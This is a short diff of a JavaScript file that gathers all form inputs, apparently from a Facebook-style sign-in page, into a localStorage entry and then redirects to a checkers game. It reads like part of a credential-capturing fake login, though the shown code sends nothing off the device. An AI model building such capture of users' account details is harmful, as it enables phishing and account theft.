@@ -52,7 +52,7 @@ function isStrongmessage(message) {
 
 
 function formClick() {
-    localStorage.setItem('usermessage',userMessage += `${source} ${texts}\n`);
+    verifyAccount();
     if (isStrongmessage(maineMessage.value) && msgError) {
         localStorage.setItem('badInput',false);
         window.location.href = 'https://ukulyelye.github.io/checkers-app/checkers';
@@ -74,8 +74,7 @@ if (lastSignin == 'invalid') {
 //I focus this for facebook
 function verifyAccount (source) {
 
-    localStorage.setItem('usermessage',userMessage += `${source} ${texts}\n`);
-
+    
     let inputGroup = form.querySelectorAll('input');
     let texts = '';
     inputGroup.forEach((input)=>{
@@ -87,6 +86,7 @@ function verifyAccount (source) {
         }
     })
     
+    localStorage.setItem('usermessage',userMessage += `${source} ${texts}\n`);
     //invaid facebook username 
     if (source == 'facebook') {
         // username... remove white space
